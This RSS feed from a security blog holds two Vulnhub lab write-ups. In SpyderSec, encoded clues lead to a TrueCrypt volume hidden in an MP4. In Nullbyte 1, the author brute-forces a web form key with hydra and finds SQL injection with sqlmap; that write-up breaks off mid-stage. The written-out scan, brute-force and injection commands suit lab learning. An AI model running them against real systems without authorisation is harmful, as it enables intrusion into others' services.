<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Vulnhub on Unlogic</title>
    <link>https://svenito.github.io/nowhere/tags/vulnhub/</link>
    <description>Recent content in Vulnhub on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 09 Sep 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://svenito.github.io/nowhere/tags/vulnhub/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>SpyderSec solution</title>
      <link>https://svenito.github.io/nowhere/2015/09/09/spydersec-solution/</link>
      <pubDate>Wed, 09 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/09/09/spydersec-solution/</guid>
      <description>&lt;p&gt;Another day, another VM. Today it&amp;rsquo;s the &lt;a href=&#34;https://www.vulnhub.com/entry/spydersec-challenge,128/&#34;&gt;SpyderSec Challenge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So let me start it up and get on it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nah3Wah.gif&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As per usual I need the IP of the machine and
the services it has running (if any). Straight from the Unlogic Cookbook&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# nmap -sn 192.168.56.0/24

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:FF:57:41 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.77 seconds

root@kali:~/Downloads# nmap -p- -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lucky me, only one service running, and it&amp;rsquo;s good old http at that.
Let&amp;rsquo;s take a look at that page then:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/IiA6MlY.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/IiA6MlY.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Without wasting much time, let&amp;rsquo;s get to the clue hunting. First things first: check the source.
And there&amp;rsquo;s clue number one, right between those script tags. It evals a function which seems to
do some text processing. I&amp;rsquo;ll open Firebug to see if that shows anything interesting, and sure
enough&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;SyntaxError&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;missing&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;statement&lt;/span&gt;
    &lt;span style=&#34;color: #ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So that&amp;rsquo;s the output from the eval. It throws an error because the result isn&amp;rsquo;t valid
javascript. It seems to me as though it might be HEX. I&amp;rsquo;ll put it through Burp&amp;rsquo;s decoder and
sure enough it resolves to &lt;code&gt;a:l:e:r:t:(:&#39;:m:u:l:d:e:r:.:f:b:i:&#39;:):;&lt;/code&gt;. That&amp;rsquo;s not going to
affect the page in any way, but I&amp;rsquo;m sure it&amp;rsquo;s a clue. I&amp;rsquo;ll note it down and carry on exploring.&lt;/p&gt;

&lt;p&gt;The CSS contains a base64 encoded gif. I decided to investigate it by converting it to a file
and opening it in Gimp to examine it. Nothing much of interest there either. Hexdump also shows
nothing of note.&lt;/p&gt;

&lt;p&gt;Ok then, apart from that there&amp;rsquo;s nothing of interest in the source, so let me move onto the images on the page.
There&amp;rsquo;s two images: &lt;code&gt;Challenge.png&lt;/code&gt; and &lt;code&gt;SpyderSecLogo200.png&lt;/code&gt;. On first glance they appear to
have nothing special about them, but once examined with &lt;code&gt;exiftool&lt;/code&gt; I see something of interest&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# exiftool Challenge.png 
ExifTool Version Number         : 9.74
File Name                       : Challenge.png
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:01 07:25:59+01:00
File Access Date/Time           : 2015:09:09 14:29:25+01:00
File Inode Change Date/Time     : 2015:09:09 14:29:19+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 540
Image Height                    : 540
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:
                                  37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:
                                  34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:
                                  33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
Image Size                      : 540x540
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hex strings are the order of the day here at SpyderSec. So back to Burp&amp;rsquo;s decoder once more
after removing all the colons. The string decodes to another hex string. Same dance again, and
I get a typical base64 string, decode once more and be rewarded with &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;. Which is
not encoded anymore. I make a note of it and carry on sleuthing.&lt;/p&gt;

&lt;p&gt;Watch out, here comes the reliable &lt;code&gt;dirbuster&lt;/code&gt;. Running it with the regular word list I discover the &lt;code&gt;v&lt;/code&gt; subdirectory.
Browsing to that however merely responds with a &lt;code&gt;403 Forbidden&lt;/code&gt; reply. I&amp;rsquo;ve not exhausted all the
nooks and crannies yet, there&amp;rsquo;s still that cookie jar to poke at.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Firebug -&amp;gt; Cookie tab -&amp;gt; URI /v/81JHPbvyEQ8729161jd6aKQ0N4/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another clue&amp;hellip;. leading me to a subdirectory under &lt;code&gt;v&lt;/code&gt;. But that&amp;rsquo;s also forbidden. Well, let
me just plug some of the data we&amp;rsquo;ve found so far into it. The random characters from the
exif data result in a 404, but the string from the javascript alert box however brings up a
download dialog for a file called &lt;code&gt;mulder.fbi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# wget http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
--2015-09-09 17:24:38--  http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13960421 (13M) [text/plain]
Saving to: ‘mulder.fbi’

mulder.fbi.1            100%[===============================&amp;gt;]  13.31M  5.52MB/s   in 2.4s   

2015-09-09 17:24:41 (5.52 MB/s) - ‘mulder.fbi’ saved [13960421/13960421]

root@kali:~/spydersec# file mulder.fbi 
mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;A video file, which when I play it, is the song &amp;ldquo;Twilight Time&amp;rdquo; by &amp;ldquo;The Platters&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;So here I hit another dead end.&lt;/p&gt;

&lt;p&gt;Let me think

&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CbfWCmv.gif&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll take inventory of the clues I have left now:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A music video &amp;ldquo;Twilight time&amp;rdquo; titled &lt;em&gt;mulder.fbi&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A seeming random string &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I ask myself, why is a video of a song named &lt;em&gt;mulder.fbi&lt;/em&gt;? So I do a little research
and after searching for &lt;code&gt;the platters &amp;quot;twilight time&amp;quot; x files&lt;/code&gt; I hit this section in a
&lt;a href=&#34;https://en.wikipedia.org/wiki/Kill_Switch_(The_X-Files&#34;&gt;Wikipedia article&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;When he puts it into the car stereo, it plays &amp;quot;Twilight Time&amp;quot; 
by The Platters. However, the agents take it to the Lone Gunmen, 
who discover that the disc contains a large quantity of encrypted data
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well if that ain&amp;rsquo;t a clue and a bit! Ok, so a little more research of what data you
can hide in a video file (search for &lt;code&gt;hiding files video mp4&lt;/code&gt;) I am directed to a
&lt;a href=&#34;http://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file&#34;&gt;Lifehacker article&lt;/a&gt;
describing the process of hiding Truecrypt volumes in MP4s. It mentions a few ways to
detect such a volume in a video, but to be honest, I might as well just try and mount the volume.
That should be the easiest and quickest way to see if I am on the right track.&lt;/p&gt;

&lt;p&gt;Sure enough, there&amp;rsquo;s a volume in the video, but it needs a password. Well there&amp;rsquo;s only
one unused piece of the puzzle left. I plug that in and there&amp;rsquo;s our volume with the &lt;code&gt;flag.txt&lt;/code&gt; file
which contains:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Congratulations! 

You are a winner. 

Please leave some feedback on your thoughts regarding this challenge.
Was it fun? Was it hard enough or too easy? 
What did you like or dislike, what could be done better?

https://www.spydersec.com/feedback
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well that was a nice challenge, especially the truecrypt volume in the MP4. That&amp;rsquo;s
something new I learned from this. So thanks to &lt;a href=&#34;https://twitter.com/Spydersec&#34;&gt;@SpyderSec&lt;/a&gt;
for the challenge, and thanks to you for stopping by to read this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Nullbyte 1 solution</title>
      <link>https://svenito.github.io/nowhere/2015/08/25/nullbyte-1-solution/</link>
      <pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/08/25/nullbyte-1-solution/</guid>
      <description>

&lt;p&gt;I&amp;rsquo;ve been AFK for a while because of various reasons, but now I&amp;rsquo;m back and have
managed to scrape a little time together to get on with some of &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&amp;rsquo;s&lt;/a&gt;
new VMs.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s start with &lt;a href=&#34;https://www.vulnhub.com/entry/nullbyte-1,126/&#34;&gt;Nullbyte 1&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-1:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 1&lt;/h1&gt;

&lt;p&gt;I ran the usual service discovery and found:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; at 2015-08-25 11:29 BST
Nmap scan report &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.101
Host is up &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;0.00057s latency&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color: #ae81ff&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 &lt;span style=&#34;color: #f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color: #f92672&#34;&gt;))&lt;/span&gt;
111/tcp open  rpcbind 2-4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;RPC &lt;span style=&#34;color: #75715e&#34;&gt;#100000)&lt;/span&gt;
777/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span style=&#34;color: #ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;HTTP server on 80 and ssh on 777. I&amp;rsquo;m going to take the straightforward one, and head
to the HTTP server first.&lt;/p&gt;

&lt;p&gt;Upon opening the page I only get an image and some text&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SlVGKol.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I ran &lt;code&gt;dirbuster&lt;/code&gt; on the root and got a couple of hits: &lt;code&gt;uploads&lt;/code&gt; and &lt;code&gt;phpmyadmin&lt;/code&gt;. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.&lt;/p&gt;

&lt;p&gt;The source of the page doesn&amp;rsquo;t reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn&amp;rsquo;t appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# exiftool main.gif 
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : &lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt; kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;: kzMb5nVYJw
Image Size                      : 235x302
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm, that comment looks unusual. Let&amp;rsquo;s try that in the URL. Initially I got a 404
but that&amp;rsquo;s because I didn&amp;rsquo;t remove the &lt;code&gt;P-):&lt;/code&gt;. Hitting &lt;code&gt;http://192.168.56.101/kzMb5nVYJw&lt;/code&gt;
takes me to a form asking for a key.&lt;/p&gt;

&lt;h1 id=&#34;stage-2:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 2&lt;/h1&gt;

&lt;p&gt;Typing in something random just shows &lt;code&gt;invalid key&lt;/code&gt;. Ok, let me take a look at the source,
see where this thing goes.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
Key:&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt; 
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- this form isn&amp;#39;t connected to mysql, password ain&amp;#39;t that complex --!&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ok, so no SQLi here then, and the password isn&amp;rsquo;t complex either. I&amp;rsquo;m guessing
a simple wordlist might solve this for me. Time to break out &lt;code&gt;hydra&lt;/code&gt; for this:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# hydra 192.168.56.101 http-form-post &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot;&lt;/span&gt; -l x -P /usr/share/dict/words -t &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; -w 30
Hydra v8.1 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; starting at 2015-08-25 11:41:58
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; max &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; tasks per &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; server, overall &lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt; tasks, &lt;span style=&#34;color: #ae81ff&#34;&gt;99171&lt;/span&gt; login tries &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;l:1/p:99171&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;, ~154 tries per task
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;STATUS&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; 18687.00 tries/min, &lt;span style=&#34;color: #ae81ff&#34;&gt;18687&lt;/span&gt; tries in 00:01h, &lt;span style=&#34;color: #ae81ff&#34;&gt;80484&lt;/span&gt; todo in 00:05h, &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; active
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;80&lt;span style=&#34;color: #f92672&#34;&gt;][&lt;/span&gt;http-post-form&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; host: 192.168.56.101   login: x   password: elite
&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; of &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; target successfully completed, &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; valid password found
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Bingo. Once I enter that into the field I am able to search for usernames.&lt;/p&gt;

&lt;h1 id=&#34;stage-3:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 3&lt;/h1&gt;

&lt;p&gt;Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don&amp;rsquo;t do much, entering nothing dumps multiple records. Maybe I will
try to &lt;code&gt;sqlmap&lt;/code&gt; the URL to see if there&amp;rsquo;s any vulnerabilities there&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch&lt;span style=&#34;color: #f92672&#34;&gt;=&lt;/span&gt;

&amp;lt;snip&amp;gt;

&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; seems to be &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&amp;#39;&lt;/span&gt; injectable 
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; testing &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; automatically extending ranges &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; UNION query injection technique tests as there is at least one other &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;potential&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; technique found
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; ORDER BY technique seems to be usable. This should reduce the &lt;span style=&#34;color: #f8f8f2&#34;&gt;time &lt;/span&gt;needed to find the right number of query columns. Automatically extending the range &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; current UNION query injection technique &lt;span style=&#34;color: #f8f8f2&#34;&gt;test&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; target URL appears to have &lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt; columns in query
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;11:13:26&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;INFO&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; GET parameter &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;usrtosearch&amp;#39;&lt;/span&gt; is &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;#39;MySQL UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span&gt; injectable
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Result! Using this we can now dump the databasenames, tables, and data in the DB&lt;/p&gt;

&lt;p&gt;(output shortened for clarity)
